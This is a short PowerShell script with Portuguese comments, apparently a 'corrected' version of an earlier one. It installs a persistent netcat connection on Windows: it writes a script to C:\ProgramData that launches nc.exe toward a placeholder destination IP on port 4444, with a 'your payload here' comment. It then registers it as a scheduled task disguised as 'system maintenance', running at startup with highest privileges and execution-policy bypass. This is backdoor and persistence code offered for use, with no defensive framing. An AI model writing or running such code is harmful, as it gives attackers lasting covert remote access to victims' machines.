# Código corrigido sem o parâmetro Hidden
$TaskName = "ManutencaoSistema"
$ScriptPath = "C:\ProgramData\Scripts\amigo.ps1"

# Criação do script com logging
$scriptContent = @"
Start-Transcript -Path "$env:TEMP\debug.log" -Append
try {
    # Seu payload aqui
    Write-Output "Conectando via netcat..."
    Start-Process -FilePath 'nc.exe' -ArgumentList '-nv ip_destino 4444'
} catch {
    Write-Output "Erro: $_"
} finally {
    Stop-Transcript
}
"@

Set-Content -Path $ScriptPath -Value $scriptContent

# Registro da tarefa com configurações apropriadas
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $ScriptPath"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -RunLevel Highest
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings
